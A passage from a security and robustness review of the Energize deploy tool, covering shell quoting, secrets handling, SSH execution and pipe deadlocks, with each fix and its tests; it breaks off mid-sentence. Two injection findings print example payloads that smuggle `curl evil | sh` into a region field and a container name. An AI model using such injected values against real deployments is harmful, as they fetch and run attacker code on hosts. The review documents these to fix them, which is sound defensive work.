---
title: Robustness Review
nav_order: 99
---

# Robustness Review — Energize (`nrg`)

**Date:** 2026-07-09
**Scope:** Full codebase — Rust core (`src/`), the Rhai standard library
(`lib/*.rhai`), tests (`tests/`, inline `#[cfg(test)]`), CI (`.github/`), and docs.
**Baseline:** the full test suite (`cargo test --all-targets --locked`) passes at
review time.

This document catalogs robustness gaps: places where the tool can lose data,
leave infrastructure in a broken state, execute an unintended command, or pass a
test suite while shipping a real defect. It is a map of where the guarantees stop —
a companion to `docs/safety.md`, which describes where they hold.

## How to read this

Findings are grouped by subsystem and tagged **Critical / High / Medium / Low**.
Severity reflects blast radius × likelihood in a realistic production deploy, not
code aesthetics. Each finding names a concrete failure scenario. A short **Verified**
note means the behavior was confirmed by reading the exact code path (file:line),
not inferred.

The codebase is, on the whole, unusually careful — see
[What is already solid](#what-is-already-solid). Most of the highest-severity items
below are in the **Rhai standard library** (`lib/`), which does the actual deploy
orchestration and has far weaker test coverage than the Rust core.

---

## Summary of highest-priority items

| # | Severity | Area | One line |
|---|----------|------|----------|
| R1 | High | stdlib / registry | ✅ resolved — `region` interpolated unquoted into an ECR login subshell (injection) |
| R2 | High | stdlib / runtime | ✅ resolved — `runtime_exec_cmd(name, command)` interpolated `container_name` unquoted (injection) |
| R3 | High | secrets | ✅ resolved — `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
| R4 | High | engine / sim | ✅ resolved — probe classifier treated "command not found" as "container absent" |
| R5 | High | engine / ssh | 🟡 partially resolved — SSH keep-alive added (dead-connection case closed); no overall command wall-clock timeout yet (a genuinely-alive-but-slow command still blocks the deploy and the lock) |
| R6 | High | stdlib / rollback | ✅ resolved — compensation failures are logged-and-continued, so a failed proxy-restore still deletes the serving container |
| R7 | High | engine / signals | ✅ resolved — no SIGINT/SIGTERM handling — Ctrl-C mid-deploy runs zero compensations |
| R8 | High | tests | ✅ resolved (R8 + R8b) — the live deploy path was never executed and `rollback()` had no tests; live-mode `FakeRunner` tests now exercise deploy(), a full rollback() round trip, and per-host health probing |
| R9 | Medium | engine / ssh | ✅ resolved — SSH alias pre-resolution dropped `Port`/`IdentityFile`/`ProxyJump` from the user's ssh config; every ssh-spawning command now passes the alias straight through and lets the real `ssh` binary resolve it |
| R10 | Medium | stdlib / deploy | ✅ resolved — `:latest` default tag silently broke the rollback chain; `deploy()` now warns, `rollback()` now refuses an automatic mutable-tag snapshot |
| R29 | High | stdlib / rollback | ✅ resolved — nesting `deploy()` inside a user `transaction()` could resurrect post-committed compensations into a blackhole (found during R6's review; pre-existing, not caused by R6) |
| R30 | Medium | stdlib / docker | ✅ resolved — `docker_run`/`docker_run_once` ignored a failed env-file write — a stale file from a prior run could be silently reused (found during R3b's review) |
| R31 | Medium | engine / sim | ✅ resolved — Podman's absent-image wording (`image not known`) didn't match the probe classifier's `"no such"` check (found during R4's review; pre-existing, not caused by R4) |
| R32 | Low | engine / sim | ✅ resolved — a LOCAL spawn failure (e.g. `ssh` missing on the machine running `nrg`) formats as "...No such file or directory", which the probe classifier's `"no such"` check misread as "container absent" (found during R4b's review; pre-existing, not caused by R4b) |

---

## 1. Shell safety in the standard library

The library establishes a strong contract (issue #10): every user-influenced value
spliced into a remote command must be `sh_quote()`'d. Two exported helpers break it.

### R1 — High — `ecr_login` interpolates `region` unquoted into a subshell — ✅ resolved
`lib/registry.rhai` (~line 83). **Verified.**

The account-auto-detect branch builds:
```rhai
login_cmd += "\"$(aws sts get-caller-identity ...).dkr.ecr." + region + ".amazonaws.com\"";
```
`region` flows from `cfg` and is spliced **raw** inside double quotes, where `$`,
backticks, and `\` stay live (the sibling occurrence on the line above *is*
`sh_quote()`'d — this one was missed). A region like
`us-east-1".amazonaws.com"; curl evil | sh; "` runs arbitrary commands on the host
as the deploy user.
**Fix:** `sh_quote(region)`, or validate the region against `^[a-z0-9-]+$`.

**Resolved (2026-07-10).** `region` is now spliced in as its own `sh_quote()`'d
(single-quoted) segment, adjacent to the surrounding double-quoted segments —
shell concatenates adjacent quoted strings with no separator, and single quotes
keep the region's contents fully literal regardless of `$`, backticks, `;`, or
embedded `"`. Covered by a real end-to-end test that runs the exact constructed
command through a real shell (`local_exec`, live — not dry-run) with a region
crafted to break out of the old unquoted context, and asserts the injected
`touch` never ran (`tests/shell_injection.rs`). Verified by reverting the fix
and confirming the test fails (the marker file IS created) against the
original code.

### R2 — High — `runtime_exec_cmd(container_name, command)` quotes neither argument — ✅ resolved
`lib/runtime.rhai:146`. **Verified.**

```rhai
fn runtime_exec_cmd(container_name, command) {
    container_cmd() + " exec " + container_name + " " + command
}
```
`docker_exec` in `docker.rhai` quotes the container name; this exported twin does
not. Any caller passing a user-influenced name (`app;curl evil|sh`) gets remote
code execution. `command` is a documented raw escape hatch, but `container_name`
should be quoted.
**Fix:** `sh_quote(container_name)`.

**Resolved (2026-07-10).** `container_name` is now `sh_quote()`'d, matching
`docker_exec`'s existing contract; `command` remains an intentional raw
escape hatch (see R28 below). Covered by the same real-shell-execution test
approach as R1 (`tests/shell_injection.rs`), also verified to fail against
the original code.

### R17 — Low — Caddy admin-API service names are shell-quoted but not URL-encoded — ✅ resolved
`lib/caddy.rhai` (lines 144, 167, 181, 192). A `service` containing `/` or `../`
(e.g. `x/../../config/admin`) addresses arbitrary Caddy config paths — `proxy_remove`
could `DELETE` unrelated config. Use `url_encode()` (already available) on path
segments.

**Resolved (2026-07-11, round 2).** All three call sites that splice `service`
into a Caddy admin-API URL path (`proxy_deploy`'s PATCH, `proxy_remove`'s
DELETE, `proxy_set_tls`'s PATCH) now wrap it in `url_encode()` before
concatenating the path — `sh_quote()` still wraps the whole command for the
shell, unchanged, but the path segment itself is now percent-encoded first, so
a `/` or `../` in `service` can no longer address a different admin-API path
than intended. Covered by 3 new integration tests in `tests/caddy_proxy.rs`
(`proxy_deploy_url_encodes_a_service_name_containing_a_slash`,
`proxy_remove_url_encodes_a_service_name_containing_a_slash`,
`proxy_set_tls_url_encodes_a_service_name_containing_a_slash`), each asserting
the dry-run plan shows the percent-encoded path and never the raw
traversal-shaped one. Mutation-verified: reverting each `url_encode()` call
individually made its corresponding test fail, restored afterward.

### R19 — Low — env keys/values written to env-files without newline/`=` validation — ✅ resolved
`lib/docker.rhai:134`. The comment says "callers must avoid newlines"; nothing
enforces it. A CI-sourced value containing `\n` (a PEM key) injects extra
`KEY=VALUE` lines into the container environment. Validate or reject control chars.

**Resolved (2026-07-11, round 2).** Added `validate_env_entry(k, v)` in
`lib/docker.rhai`, called once per key before any env-file line is built (so a
bad entry is refused up front, before a partial/stale env-file could ever be
written): refuses a key or value containing `\n`/`\r` (would inject extra
`KEY=VALUE` lines), and refuses a key containing `=` (not a valid environment
variable name). Called from both `docker_run` and `docker_run_once` — the two
places that build an env-file — so every caller that reaches either (including
`accessory_run` and `deploy()`'s own `pre_deploy` release-task call) inherits
the validation automatically.

Fable's final review of the first version of this fix found two real gaps:
(1) the key-newline check had NO test at all — mutating it out left the whole
suite green; (2) `v.contains(...)` assumed `v` is always a string, but Rhai map
values aren't restricted to strings and `k + "=" + v` already coerced a bare
int/bool via string concat before this fix — so `envs: #{ PORT: 3000 }`, valid
before, now died with an opaque "Function not found: contains" instead of
either validating or passing. Both fixed: `v` is now coerced (`let vs = "" + v;`)
to the same representation the env-file line itself will contain before being
checked, and a dedicated key-newline test was added.

Covered by 6 new unit tests in `src/engine/eval.rs`: refuses a newline in the
value, refuses `=` in the key, refuses a newline in the KEY, the
`docker_run_once` sibling refuses a value-newline too, a regression check that
an ordinary string value still works unaffected, and a regression check that
non-string values (`int`, `bool`) still work unaffected (the exact case the
review's second finding broke). Mutation-verified: disabling each of the three
`validate_env_entry` checks (key-newline, key-equals, value-newline) and the
value-coercion line individually made its corresponding test fail for the
right reason, restored afterward.

### R28 — Low — documented raw escape hatches — ✅ resolved
`cfg.extra`, `docker_run_once`'s command, `docker_exec`'s command, and
`pre_deploy_cmd` / `post_deploy_cmd` are interpolated verbatim into remote shell
commands (`docker.rhai`, `deploy.rhai:300`). This is intentional, but the safety
contract silently exempts four fields — a reader who trusts "everything is quoted"
is wrong. Document these prominently as trusted-input-only.

**Resolved (2026-07-11, round 3), documentation-only.** Added a new
"Escape hatches: trusted-input-only raw shell" section to `docs/safety.md`
(end of "3. Secrets") naming all four fields in a table, explaining exactly
why the rest of the stdlib's quoting guarantee doesn't apply to them, and
giving the rules for using them safely (trusted-input-only, keep secrets out,
`sh_quote()` any embedded caller value yourself). Added an inline comment at
each of the four call sites (`docker_run`'s `extra`, `docker_run_once`'s
`command`, `docker_exec`'s `command`, `deploy()`'s `pre_deploy_cmd`/
`post_deploy_cmd` including the `run_post_deploy_hook` helper) explicitly
naming it a "TRUSTED-INPUT-ONLY raw-shell escape hatch (robustness review
R28)" and pointing back at the doc, plus a matching note in `deploy()`'s own
`cfg` doc-comment block. No behavior change — this was purely a documentation
gap, not a code bug.

---

## 2. Secrets

### R3 — High — `ENC[...]` tokens are never decrypted at runtime — ✅ resolved
`src/engine/secret.rs` (`lookup_secret`) vs `src/secrets/mod.rs`. **Verified** —
there is no reference to `ENC[` or `decrypt` anywhere under `src/engine/`.

`nrg secrets encrypt` produces an `ENC[...]` token and the docs (`docs/cli.md`)
tell users to paste it into config or an env file. But `secret("NAME")` reads the
value verbatim from `.env` / `.energize/secrets` and never decrypts it. A user who
follows the documented workflow ships the **raw ciphertext** as the database
password / registry token. The encrypt/seal feature and runtime resolution are only
connected by the operator manually `unseal`-ing first — which is undocumented as a
requirement.
**Fix:** either decrypt `ENC[...]` tokens in `lookup_secret` (locate the key via the
existing `find_key_file`), or document loudly that inline `ENC[...]` in `.env` is
**not** auto-decrypted and only whole-file `seal`/`unseal` is supported.

**Resolved (2026-07-10).** `secret()` now transparently decrypts an `ENC[...]` value
via the discovered `.nrg-key` before it's ever used, throwing a clear error if no key
is found or decryption fails (`src/engine/secret.rs`'s `decrypt_if_needed`). This also
surfaced and fixed a second, related bug: `nrg secrets encrypt`'s `age -a` armored
output is multi-line PEM, which can never survive being pasted into a single
`KEY=VALUE` line — `encrypt_value`/`decrypt_value` (`src/secrets/mod.rs`) now
`|`-join/split the armor so the token is actually single-line-safe, which the
documented "paste into `.env`" workflow requires. Covered end-to-end by
`tests/secrets_age.rs`'s `secret_transparently_decrypts_an_enc_token_pasted_into_env`
(closes the "nothing pins what `secret()` does with a sealed value in `.env`" gap
noted below under "Secrets error paths").

### R24 — Low — full effective config (with revealed secrets) persisted to state — ✅ resolved
`lib/deploy.rhai:243`. `state_set(service + ".config", to_json(cfg))` writes every
env value — typically revealed secrets — as plaintext JSON into
`.energize/state.json`. `0600` mitigates local exposure, but workspace archiving,
CI artifact upload, or a state backup exfiltrates them. Consider redacting secret
env values from the persisted config, or storing only non-secret keys.

**Resolved (2026-07-11, round 3), documentation-only — redaction was
considered and rejected.** Actually redacting secret env values out of the
persisted `<service>.config` (or omitting them) would silently break
`rollback()`, which reads this exact key back
(`replay = from_json(state_get(service + ".config"))`) to replay the SAME env
vars into a real redeploy — a redacted `"***"` value would deploy a container
missing (or with a garbled) credential instead of a working rollback target.
That tradeoff isn't something a Low-severity finding should force through
silently, so instead this is now documented prominently: a new "Deploy state
may contain secret plaintext" section in `docs/safety.md` (end of "2. State
locking") explains the tradeoff in full, what `0600` does and doesn't protect
against, and what operators must do (never commit/archive/upload
`.energize/` unprotected; treat any manual backup of it the same way). A new
inline comment sits directly above the `state_set(service + ".config", ...)`
call site in `lib/deploy.rhai` pointing at that doc section. `docs/deploy.md`'s
"State keys" table now also lists the `<service>.config` and
`nrg.runtime.cmd`/`.name` keys (previously undocumented there at all) with a
link to the same safety-doc section. No behavior change.

### R8b / secrets CLI — Medium — plaintext on argv — ✅ resolved
`src/cli/secrets.rs`. `nrg secrets encrypt <value>` and `decrypt <token>` take the
value **on the command line** (visible in `ps` and shell history) — ironic given the
care the exec builtins take to keep passwords off argv. Add a stdin mode
(`--stdin` / read when value omitted).

**Resolved (2026-07-10, round 2).** `value`/`token` are now optional positionals;
omitting either reads it from stdin instead (`echo -n "$SECRET" | nrg secrets
encrypt`). A new `read_stdin_value` helper strips exactly one trailing line
ending (`\n` or `\r\n` — the shape a pipe or heredoc naturally produces) without
touching any other whitespace the value might genuinely contain, and refuses an
empty result (covers both "nothing on argv and nothing on stdin either"). Covered
by `encrypt_and_decrypt_read_from_stdin_when_the_value_is_omitted` and
`encrypt_refuses_empty_input_from_both_argv_and_stdin` in `tests/secrets_age.rs`,
mutation-verified: disabling the empty-check and disabling the newline-strip each
made the corresponding test fail for the right reason.

### unseal writes plaintext without 0600 — ✅ resolved
`src/secrets/mod.rs` (`unseal_file`). The decrypted `.env` is written with the
process umask, not `0600`, and overwrites any existing `.env` without warning. A
locally edited `.env` is silently clobbered, and the plaintext sits world-readable
by default.

**Resolved (2026-07-10, round 2).** `unseal_file` now takes an `overwrite: bool`
and refuses (throwing a clear "already exists ... pass --force" error) when the
output path exists and `overwrite` is false — the new `nrg secrets unseal
<file> --force` flag opts in explicitly. On success, the decrypted output is
force-set to owner-only (0600) the same way the private identity already is,
regardless of the process umask. Covered by
`unseal_refuses_to_clobber_an_existing_output_file_without_force` (also asserts
a locally-edited file survives the refused attempt, then succeeds with
`--force`) and an added assertion in `secrets_seal_unseal_round_trip` (both in
`tests/secrets_age.rs`), mutation-verified: disabling the existence check and
disabling the 0600 enforcement each made the corresponding assertion fail.

### pubkey scraped from stderr without validation — ✅ resolved
`src/secrets/mod.rs` (`generate_key_pair`). The public key is parsed from
`age-keygen` stderr and `unwrap_or("")` — if the output format drifts, an **empty**
`.nrg-key.pub` is written silently and every later `encrypt` fails cryptically.
Validate the extracted key starts with `age1`.

**Resolved (2026-07-10, round 2).** Extracted the parse into its own pure
`parse_and_validate_pubkey(stderr)` function (unit-testable without needing to
fake `age-keygen`'s real stderr) which now refuses to return anything that
doesn't start with `age1` — the private key is still written (so nothing is
lost), but `.nrg-key.pub` is never written with an empty or garbled value, and
the error message points at the exact private-key path and a manual
`age-keygen -y` fallback. Covered by 3 new unit tests in `src/secrets/mod.rs`
(accepts a real `Public key: age1...` line, rejects a missing `Public key:`
line entirely, rejects a value not starting with `age1`), mutation-verified:
disabling the `age1` check made both rejection tests fail.

### R27 — Low — runtime choice leaks across projects — ✅ resolved
`lib/runtime.rhai`. `set_runtime()` stores into the **persistent global** state
store, so a `podman` choice in one project leaks into a later run of a different
script on the same control machine that never called `set_runtime`. Under dry-run
auto-detect always resolves to `docker`, so the plan can show `docker …` while the
live run issues `podman …`.

**Resolved (2026-07-11, round 3).** The state store is actually per-PROJECT
(`state_path(root) = root/.energize/state.json`), so the precise bug wasn't
literally "leaks across unrelated projects" — it was that the runtime choice is
**sticky across separate invocations of the SAME project**: `set_runtime("podman")`
persisted to the durable state store, so a LATER `nrg exec`/`nrg run` of the same
project that never calls `set_runtime()` at all (e.g. after the line is deleted
from `Energize.rhai` to revert to the default) would silently keep resolving to
whatever a past run last persisted, instead of the documented default.

Added a new, genuinely ephemeral (in-memory-only, never touches disk)
`session_set`/`session_get`/`has_session` builtin trio (`src/engine/context.rs`'s
new `RunCtx::session` field, registered in `src/engine/builtins/state.rs`) —
this is what `state_set`/`state_get` were being repurposed for in the first place
per `lib/runtime.rhai`'s own PORT NOTE (sharing a value across separate `import`s
within ONE script run), but without the accidental durability. `container_cmd()`/
`runtime_name()` now read exclusively from `session`, defaulting to `"docker"` if
`set_runtime()`/`auto_detect()` was never called THIS run. `set_runtime()` and
`auto_detect()` still ALSO write to the durable `state_set` store under the same
keys — that mirror is intentional and load-bearing, not a leftover: `nrg status`/
`nrg logs`/`nrg app exec` (`src/cli/status.rs`, `logs.rs`, `app.rs`) are separate
CLI invocations that never re-run the deploy script, so they read
`nrg.runtime.cmd` straight from the on-disk state to know which CLI a past deploy
used — removing the durable write would have broken those commands for anyone on
podman/nerdctl. `src/engine/builtins/sim.rs`'s Live-mode probe helper
(`runtime_cmd`) was updated the same way, so a script's own container/health
probes during a run agree with its own `set_runtime()` call (or its absence)
rather than a stale persisted value.

Covered by: two new unit tests in `src/engine/builtins/state.rs`
(`session_set_get_has_roundtrip_in_script`, `session_set_never_touches_disk` —
the latter asserts `.energize/state.json` is never created by a `session_set`
call against a REAL on-disk project); a new integration test in
`src/engine/eval.rs`
(`a_previous_runs_persisted_runtime_choice_does_not_leak_into_a_later_run`) that
runs the REAL `lib/runtime.rhai`/`lib/docker.rhai` twice against the same on-disk
project root — the first run calls `set_runtime("podman")` and the test asserts
the choice IS persisted to disk (so status/logs still work), then a second,
independent run that never calls `set_runtime()` is asserted to issue `docker
run`, not `podman run`; and a new unit test in `src/engine/builtins/sim.rs`
(`live_probe_ignores_a_stale_persisted_runtime_from_a_previous_run`). All three
are mutation-verified: reverting `container_cmd()`/`runtime_name()` to read
`state_get` instead of `session_get` made the `eval.rs` test fail for the right
reason (it issued `podman run` instead of `docker run`); reverting
`sim.rs::runtime_cmd` to read `ctx.state` instead of `ctx.session` made the
`sim.rs` test fail the same way (it probed with `podman inspect`).

**Follow-up (found during this fix's own Opus review).** The durable mirror
(`state_set` in `set_runtime()`/`auto_detect()`) is only ever WRITTEN when a
script explicitly calls `set_runtime()`. So a script that once called
`set_runtime("podman")` and is later edited to drop that call entirely would
correctly deploy with docker afterward (the fix above), but the durable mirror
would keep saying `"podman"` forever — nothing else ever overwrote it — silently
misleading `nrg status`/`nrg logs`/`nrg app exec` about a runtime that service
hasn't used since the edit. Fixed by having `deploy()` (`lib/deploy.rhai`)
re-persist `rt::container_cmd()`/`rt::runtime_name()` on every successful
deploy, alongside its existing `<service>.version`/`.image` writes — so the
durable copy always reflects the runtime the LAST ACTUAL DEPLOY resolved to,
not just the last explicit `set_runtime()` call (`rollback()` gets this for
free, since it calls `deploy()` internally). This narrows, but doesn't fully
close, the staleness window: `set_runtime()`/`auto_detect()` still eagerly
write the durable mirror at script START (unchanged, pre-existing behavior —
load-bearing for scripts that only use `docker.rhai` directly, without ever
calling `deploy()`), so a run that switches runtimes and then fails before
ever reaching a successful deploy still leaves the mirror pointing at the new,
not-yet-actually-deployed runtime. That inverse case is out of scope here.
Covered by a new integration test,
`deploy_re_persists_the_actual_runtime_it_used_even_without_set_runtime`
(`src/engine/eval.rs`): deploy v1 under `set_runtime("podman")`, then deploy v2
from a script that never calls `set_runtime()` at all, and assert BOTH that the
second deploy actually issues `docker` commands AND that the durable
`nrg.runtime.cmd` is corrected to `"docker"` afterward. Mutation-verified:
commenting out the two new `state_set` calls in `deploy()` made the test fail
for the right reason (the durable mirror stayed stale at `"podman"`).

---

## 3. SSH execution (`src/engine/runner.rs`, `src/ssh/config.rs`)

### R5 — High — no command timeout, no SSH keep-alive — 🟡 partially resolved
`RealRunner`. `ssh_command` sets `ConnectTimeout=10` (connect only) but no
`ServerAliveInterval` / `ServerAliveCountMax` and no overall command timeout. A
remote command that hangs after connecting (network partition mid-run, a wedged
`docker pull`, a stuck healthcheck) blocks the calling thread **forever** — and
because a live run holds the advisory state lock for its whole lifetime, it wedges
every future run on that project too.
**Fix:** add `-o ServerAliveInterval=15 -o ServerAliveCountMax=4`, and consider a
wall-clock cap per command.

**Partially resolved (2026-07-10).** Took the first half: `ssh_command`
(`src/engine/runner.rs`) now also sets `ServerAliveInterval=15` and
`ServerAliveCountMax=4`. This closes the "network partition mid-command,
connection goes silently dead" case — `ssh` itself now probes the
connection and exits non-zero after ~60s of no replies, instead of blocking
in a `read()` that a dead TCP connection alone never unblocks. Covered by a
unit test, `ssh_command_sets_keepalive_options`
(`src/engine/runner.rs`), that inspects the actual built `Command`'s args —
confirmed to fail (missing both options) against the code before this fix.
An Opus review pass on this fix flagged that `nrg logs`'s own separate ssh
invocation (`src/cli/logs.rs`, used for the `-f` follow-mode long-lived
stream) had the identical exposure — fixed the same way in the same slice
(`ssh_stream_command`, with its own equivalent unit test). A follow-up
Fable review flagged that `nrg app exec`'s own separate ssh invocation
(`src/cli/app.rs`, `ssh_extra_args`) had the same gap (lower severity — this
call site holds no state lock — but the non-interactive path is documented
CI-safe, so an unattended hang there is still a real problem) — fixed the
same way, with both of its existing unit tests updated to assert the new
options. That same Fable pass also flagged that neither
`ssh_command_sets_keepalive_options` nor
`ssh_stream_command_sets_keepalive_options` pinned the `--`
end-of-options separator's *position* (only that the keep-alive options
were present) — a regression that moved or dropped `--` would have slipped
through undetected, even though the `starts_with('-')` host guard is a
second independent layer against option injection. Both tests gained an
exact-equality assertion on the trailing args to pin `--`'s placement, and
the illustrative `ssh` invocation in `docs/architecture.md` (which was
missing `--` even before this session) was corrected to match.

**Still open:** this does NOT cap how long a genuinely-alive, slow remote
command may run (a wedged `docker pull` that's still technically
responsive at the TCP level, or a healthcheck loop that's just slow). That
needs a separate wall-clock timeout wrapping each command — a larger change
(deciding a sensible default/override knob, and how it interacts with the
R7 interrupt-handling `on_progress` poll, since a killed-by-timeout command
and a killed-by-signal command should probably behave the same way toward
the enclosing transaction) — not attempted in this slice.

### R9 — Medium — alias pre-resolution defeats `~/.ssh/config` — ✅ resolved
`SshConfig::resolve_host` reads only `HostName` and `User`, builds `user@hostname`,
and hands **that** to `ssh`. Because the argument is now a literal address, `ssh`'s
own `Host` block matching never fires, so `Port`, `IdentityFile`, `ProxyJump`,
`ProxyCommand`, `IdentitiesOnly`, etc. from the user's config are **silently
dropped**. An alias defined with `Port 2222` connects on 22.
**Fix:** pass the original alias to `ssh` and let ssh resolve it, or parse and
forward the remaining directives. At minimum, document that only `HostName`/`User`
are honored.

**Resolved (2026-07-10).** Went with the first option: every command that spawns
a real `ssh` (`RealRunner::ssh_command` in `src/engine/runner.rs`, used by `nrg
exec`/`nrg run`; `nrg ssh`; `nrg app exec`; `nrg logs`) now passes the ORIGINAL
alias straight through, instead of a hand-resolved `user@hostname` string — the
REAL `ssh` binary does its own, complete config resolution, exactly like a plain
interactive `ssh <alias>` would, so `Port`/`IdentityFile`/`ProxyJump`/
`ProxyCommand`/`IdentitiesOnly`/`Host *` wildcards/`Match` blocks all apply
correctly, for free, without reimplementing any of them. `RealRunner` no longer
holds an `SshConfig` at all (there's nothing left for it to consult) — a genuine
simplification, not just a workaround. `nrg app exec` and `nrg ssh` still call
`SshConfig::resolve_host` once, but ONLY to print a friendly "Connecting to
HostName..." confirmation line — that value is no longer used as the actual
connection target, so a resolver that's wrong or incomplete there is now purely
cosmetic, never a silent misconnection. The option-injection defense
(`looks_like_option`/`starts_with('-')`) now checks the alias itself (the thing
actually reaching `ssh`'s argv) rather than a resolved value, which is the more
direct and correct place to check it anyway.

Covered by three new end-to-end integration tests in
`tests/ssh_alias_passthrough.rs` (`nrg_ssh_passes_the_alias_through_unresolved`,
`nrg_app_exec_passes_the_alias_through_unresolved`,
`nrg_logs_passes_the_alias_through_unresolved`) using a FAKE `ssh` executable on
`PATH` that records its own argv, paired with a `~/.ssh/config` Host block
mapping the test alias to a deliberately different, distinctive `HostName`/`User`
— proving the real invocation contains the alias and NOT the substitute address.
All three mutation-verified (reverted each file's fix back to using the resolved
value, confirmed the corresponding test fails on the substitute address, restored).
`RealRunner::ssh_command`'s own existing unit tests were sufficient evidence for
that call site — it no longer has any `SshConfig` to consult at all, so there's
no separate resolution behavior left to prove wrong.

This fix also neuters most of the SSH config parser fidelity gap below for the
connection-building path specifically (ssh's own native config parsing handles
wildcards/`Match`/`Include` correctly regardless of this project's parser) — that
finding still applies to the now-purely-cosmetic "Connecting to..." display line
in `nrg app exec`/`nrg ssh`.

Opus's adversarial review (SHIP AS-IS) flagged one non-blocking nitpick on that
same display line: printing the resolver's incomplete hint as if it were the
real destination ("Connecting to *on* `<hint>`...") could still mislead an
operator when the hint omits a `ProxyJump`/non-default `Port`. Tightened both
banners to say "Connecting to `<alias>`..." unchanged when the resolver's hint
matches the alias, or "Connecting to `<alias>` (resolves to `<hint>` per
`~/.ssh/config`)..." when it differs — framing it explicitly as a hint rather
than a claim about the actual destination.

### SSH config parser fidelity — Medium — ✅ resolved (test-only)
`src/ssh/config.rs` handles only single-name `Host alias` blocks with exact,
case-sensitive matching. It does **not** support `Host *` wildcards, multi-pattern
lines (`Host web1 web2`), `Match` blocks (explicitly skipped), or `Include`. A user
whose `~/.ssh/config` sets `User deploy` under `Host *` connects as the wrong user.
No test documents the divergence. Since R9's fix (above), this parser's output is
no longer used to build any actual SSH connection — only the informational
"Connecting to..." display line in `nrg app exec`/`nrg ssh` — so this gap's
practical impact is now purely cosmetic (a wrong/incomplete confirmation message),
not a silent misconnection.

**Resolved (2026-07-11, round 3), test-only — no code change.** Given the
finding's own conclusion that the impact is now purely cosmetic (a display
line, not a real connection), fixing the parser to add real `ssh_config(5)`
fidelity (glob matching, multi-pattern `Host` lines, `Match`, `Include`) would
be a disproportionate amount of new parsing logic for a value nothing security-
or correctness-relevant depends on anymore. Instead, added three tests to
`src/ssh/config.rs` that pin down and DOCUMENT the exact divergence (previously
just asserted in this doc, never exercised in code):
`host_wildcard_is_not_supported_only_exact_alias_names_match` (a `Host *`
block never applies to a real alias), `multi_name_host_line_collapses_to_one_literal_key_not_two_aliases`
(`Host web1 web2` becomes ONE literal key `"web1 web2"` rather than two
aliases — documents the exact, surprising shape of the gap, not just its
absence), and `match_blocks_are_skipped_directives_inside_never_apply_to_any_host`
(a `User` set inside a `Match` block is silently discarded, never attached to
the preceding `Host` block). `Include` was not separately tested — this
parser never attempts to open any file besides the one path it's handed, so
an `Include` directive is simply an unrecognized key ignored the same way any
other unsupported directive is (already implicitly covered by the existing
"Ignore other directives" `_ =>` arm).

### piped() write-before-read can deadlock on large payloads — Medium — ✅ resolved
`runner.rs` (`piped`). It writes the entire stdin payload, then reads output. For a
small password this is fine (as the comment notes), but `write_remote` of a large
env-file/config while the remote writes >64 KB to stdout can fill the OS pipe buffer
and deadlock both sides. Use a writer thread or `spawn` + concurrent drain for
large payloads.

**Resolved (2026-07-11, round 3).** Took exactly the suggested approach.
`piped()` (`src/engine/runner.rs`) now writes `stdin` on a dedicated
background thread, running concurrently with `wait_with_output()`'s own
internal draining of stdout/stderr (which already reads both streams on
separate threads, for the identical reason). With all three streams
serviced concurrently, no side's pipe buffer can ever fill while the
other side is blocked waiting to be read. The thread needs an owned
`String` (it isn't scoped to the function, so it can't borrow `stdin:
&str`) and is joined after `wait_with_output()` returns — by then the
child has already exited, so the join is pure cleanup, not something
that can itself block meaningfully. Covered by a new test,
`piped_does_not_deadlock_on_a_large_stdin_payload_paired_with_large_output`
(`src/engine/runner.rs`), which pipes a 4 MiB payload through `cat`
(a command that simultaneously reads stdin and echoes it straight back
to stdout — exactly the shape that deadlocks under write-before-read
once the payload exceeds the OS pipe buffer). The test itself runs the
call on a background thread with a bounded `recv_timeout`, so that if
this ever regresses to the deadlocking implementation, the ONE test
times out and fails cleanly instead of hanging the whole suite forever.
Mutation-verified: reverting `piped()` to the old write-then-`wait_with_output`
implementation made the new test fail for the right reason — the
`recv_timeout` genuinely elapsed (10.1s), reproducing the real deadlock
this finding described, not just some other unrelated failure.

**Follow-up (found during this fix's own Opus review) — no blocking
issues, two polish items applied.** Opus verified the fix is correct and
found no regression: a write to a closed pipe returns `EPIPE`/`BrokenPipe`
rather than hanging (Rust's runtime sets `SIGPIPE` to `SIG_IGN`), so a
child that exits before reading all of stdin unblocks the writer promptly
rather than leaving it stuck forever — the same or better than the old
code, which would have blocked identically on its own `write_all`. It
suggested two non-blocking improvements, both applied: (1) `piped()` now
uses `std::thread::scope` instead of a `'static` `thread::spawn`, letting
the writer thread borrow `stdin: &str` directly instead of needing an
owned `.to_string()` copy — worth doing specifically because `stdin` here
is often secret material (a password, an env-file body via
`write_remote`), so avoiding a second un-freed-until-drop heap copy of it
matters more than it would for an arbitrary payload. (2) The regression
test's failure message no longer conflates "genuinely deadlocked" with "the
spawned thread panicked before sending a result" (the latter would actually
return promptly via a disconnected channel, not wait out the full timeout,
but was mislabeled either way) — it now distinguishes `RecvTimeoutError::Timeout`
from `RecvTimeoutError::Disconnected` with a distinct message for each.
Re-verified after both changes: the deadlock mutation-test still fails for
the right reason (10.1s elapsed) with the `thread::scope` version.

**Follow-up (found during this fix's own Fable final review) — verdict
"ship it," one cosmetic comment reworded.** Fable independently re-verified
the `thread::scope` closure returns only an owned `RawOutput` (nothing
borrowed escapes the scope), confirmed no MSRV conflict (`thread::scope`
needs Rust 1.63; the project pins none, and `rhai`'s own MSRV of 1.66
already exceeds it), confirmed the one real behavior change from the
`thread::scope` refactor (a panicking writer thread now propagates instead
of being silently swallowed by `let _ = writer.join()`) is unreachable in
practice since the writer body only ever calls `write_all(...).discard()`,
which can't panic, and personally re-ran the mutation test itself (reverted
`piped()` in the working tree, confirmed the 10.1s deadlock failure,
restored, confirmed clean). The one nit: the comment directly above the
`match child.wait_with_output()` call read awkwardly and conflated "this
match's result" with "the value `piped()` ultimately returns" (subtly
different, since the match is evaluated *inside* the still-open
`thread::scope` block) — reworded for precision, no behavior change.

### Signal-killed process indistinguishable from spawn failure — Low — ✅ resolved
Exit code `-1` is returned for spawn failure, wait failure, option-injection
rejection, **and** a signal-terminated process (`status.code()` is `None`). Scripts
branching on `exit_code` can't tell these apart. Consider `128 + signal` for the
signal case.

**Resolved (2026-07-11, round 3).** Took exactly the suggested approach.
`RealRunner`'s three `Ok(o) => RawOutput { exit_code: ..., .. }` sites (in
`run_ssh`, `run_local`, and the shared `piped` helper used by both `_stdin`
variants) now go through a new `exit_code_of(&status)` helper
(`src/engine/runner.rs`): `Some(code)` passes through unchanged; `None` (a
signal-terminated process) maps to `128 + signal` via
`ExitStatusExt::signal()` on Unix, falling back to the pre-existing `-1`
sentinel only in the practically-unreachable case where BOTH `code()` and
